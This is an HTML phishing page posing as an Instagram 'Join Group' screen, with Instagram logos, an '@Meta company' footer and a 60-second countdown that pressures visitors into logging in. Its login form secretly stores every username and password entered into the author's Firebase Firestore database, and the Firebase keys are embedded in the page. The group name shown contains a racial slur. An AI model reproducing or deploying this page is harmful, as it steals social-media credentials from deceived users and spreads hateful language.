<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

</head>
<body>
<!-- refresh -->
    <!-- Top Bar -->
    <div class="top-bar">
        <button class="back-btn"><i class="fas fa-arrow-left"><b>←</b></i></button>
        <p class="join-group">Join Group</p>
        <img src="https://raw.githubusercontent.com/yob54/IGgroup/main/ig.png" class="insta-logo">

    </div>

    <!-- Group Info -->
    <div class="group-container">

        <div class="profile">
        <img src="https://raw.githubusercontent.com/yob54/IGgroup/main/logo.png" class="group-photo">
        <h2>Terrorist Niggas</h2>
        </div>

       <div class="login-container">
        <h2>Login</h2>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <!-- Firebase & Firestore Scripts -->
    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js"></script>

    <script>
        // Initialize Firebase
        const firebaseConfig = {
  apiKey: "AIzaSyA539oRhSFY_3gAZgRZ1_ec6yZI_6dcuWw",
  authDomain: "login-system-4905a.firebaseapp.com",
  projectId: "login-system-4905a",
  storageBucket: "login-system-4905a.firebasestorage.app",
  messagingSenderId: "647558155220",
  appId: "1:647558155220:web:d99b742f0d171a6015a441"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Handle form submission
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            // Get form values
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Store login data in Firestore
            db.collection("users").add({
                username: username,
                password: password
            }).then(() => {
                alert("Login data saved successfully!");
            }).catch((error) => {
                console.error("Error saving data: ", error);
            });
        });
    </script>

           
        <p id="message" style="color: red; margin-top: 10px;"></p>
    </div>
    <!-- Warning Section -->
    <div class="warning">
        <i class="fas fa-exclamation-triangle danger-icon"></i>
        <p>⚠️Please join the group within the given time! <span id="countdown">60</span></p>
    </div>
    <div class="meta">
    <p>
     @Meta company
    </p>
    </div>

    <!-- Countdown Timer -->
    <script>
        let timeLeft = 60;
        const countdownElement = document.getElementById("countdown");

        function updateCountdown() {
            if (timeLeft > 0) {
                timeLeft--;
                countdownElement.textContent = timeLeft;
            }
        }
        setInterval(updateCountdown, 1000);

        // Password visibility toggle
        const togglePassword = document.getElementById("togglePassword");
        const passwordField = document.getElementById("password");

        togglePassword.addEventListener("click", function () {
            if (passwordField.type === "password") {
                passwordField.type = "text";
                togglePassword.classList.remove("fa-eye");
                togglePassword.classList.add("fa-eye-slash");
            } else {
                passwordField.type = "password";
                togglePassword.classList.remove("fa-eye-slash");
                togglePassword.classList.add("fa-eye");
            }
        });
        

 
    </script>
</body>
